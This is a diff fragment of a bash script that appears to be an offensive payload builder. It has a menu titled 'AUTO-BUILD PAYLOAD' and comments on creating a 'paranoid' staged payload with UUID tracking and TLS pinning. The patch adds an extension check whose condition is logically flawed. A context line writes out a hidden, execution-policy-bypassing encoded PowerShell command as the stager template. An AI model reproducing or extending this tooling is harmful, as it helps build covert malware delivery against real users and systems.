@@ -265,6 +265,17 @@ BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose paylo
 if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
   sleep 1
+  #
+  # Check for NON-compatible extensions (staged payloads) ..
+  #
+  if ! [ "$DEFAULT_EXT" = "bat" ] || [ "$DEFAULT_EXT" = "ps1" ] || [ "$DEFAULT_EXT" = "txt" ]; then
+    # NOT compatible payload extension found ..
+    echo ${RedF}[x] Aborting script execution ..${Reset};
+    echo ${RedF}[x]${white} Extension:${RedF}$DEFAULT_EXT ${white}'(Not compatible)' with ${RedF}Staged${white} payloads ..${Reset};
+    echo ${RedF}[x]${white} Edit script and chose bat or ps1 or txt extensions ..${Reset};
+    sleep 1
+    exit
+  fi
     #
     # Create a Paranoid Payload (staged payload)
     # For this use case, we will combine Payload UUID tracking with TLS pinning.
@@ -298,6 +309,8 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
           echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $str0" > $IPATH/output/template
           mv -f template paranoid-staged.$DEFAULT_EXT
         fi
+
+
 
 
   # 
